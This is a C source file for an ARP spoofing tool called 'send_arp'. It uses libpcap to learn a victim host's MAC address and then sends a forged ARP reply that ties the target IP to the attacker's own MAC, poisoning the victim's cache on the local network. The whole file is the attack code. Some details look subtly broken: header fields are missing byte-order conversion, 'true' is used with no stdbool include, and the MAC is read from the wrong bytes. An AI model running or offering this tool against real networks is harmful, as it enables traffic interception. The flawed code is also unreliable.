#include <stdio.h>
#include <pcap.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>

//payload
typedef struct arp_packet{
  uint8_t sender_mac[6];
  uint8_t attacker_mac[6];
  uint16_t type;
  
  uint16_t hw_type;
  uint16_t protocol_type;
  uint8_t hw_size;
  uint8_t protocol_size;
  uint16_t opcode;
  uint8_t attacker_mac2[6];
  uint8_t target_ip[4];
  uint8_t sender_mac2[6];
  uint8_t sender_ip[4];
} packet;

void usage() {
  printf("syntax: send_arp <sender ip> <target ip>\n");
  printf("example: sned_arp 192.168.10.2 192.168.10.1\n");
}

void ping(uint8_t ip[4]) {
  char cmd[40];
  sprintf(cmd, "ping -c 1 %d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
  system(cmd);
  return;
}

int main(int argc, char* argv[]){
  if (argc != 3) {
    usage();
    return -1;
  }
  
  //parse ip
  uint8_t sender_ip[4], target_ip[4];
  sender_ip[0] = (uint8_t)atoi(strtok(argv[1], "."));
  for(int i = 1; i < 4; i++) {
    sender_ip[i] = (uint8_t)atoi(strtok(NULL, "."));
  }
  target_ip[0] = (uint8_t)atoi(strtok(argv[2], "."));
  for(int i = 1; i < 4; i++) {
    target_ip[i] = (uint8_t)atoi(strtok(NULL, "."));
  }

  //get my mac address
  pcap_if_t *alldevps;
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_findalldevs(&alldevps, errbuf);
  
  int s = socket(AF_INET, SOCK_DGRAM, 0);
  if(s < 0)
    perror("soccket fail");

  struct ifreq ifr;
  strncpy(ifr.ifr_name, alldevps->name, IFNAMSIZ);

  if(ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
    perror("ioctl fail");

  unsigned char* mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
  close(s);
  
  char* dev = alldevps->name;
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  //ping to sender_ip and get sender_mac
  uint8_t sender_mac[6];
  while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    ping(sender_ip);
    unsigned char ip_check[2] = {0x08, 0x00};
    if(!memcmp(packet+12, ip_check, 2)) {
      if(packet[30] == sender_ip[0] && packet[31] == sender_ip[1] && packet[32] == sender_ip[2] && packet[33] == sender_ip[3]){
        for(int i = 0; i < 6; i++){
          sender_mac[i] = (uint8_t)packet[i];
        }
        break;
      }
    }
  }

  //make payload packet
  packet pk;
  for(int i = 0; i < 6; i++){
    pk.sender_mac[i] = sender_mac[i];
    pk.sender_mac2[i] = sender_mac[i];
    pk.attacker_mac[i] = mac[i];
    pk.attacker_mac2[i] = mac[i];
  }
  for(int i = 0; i < 4; i++){
    pk.target_ip[i] = target_ip[i];
    pk.sender_ip[i] = sender_ip[i];
  }
  pk.type = 0x0806; //ethernet
  pk.hw_type = 0x0001; //arp
  pk.protocol_type = 0x0800; //ip
  pk.hw_size = 0x06;
  pk.protocol_size = 0x04;
  pk.opcode = 0x0002; 
  //send packet
  int length = sizeof(pk);
  unsigned char packet[42];
  memcpy(packet, &pk, length);
  pcap_sendpacket(handle, packet, length);
  return 0;
}
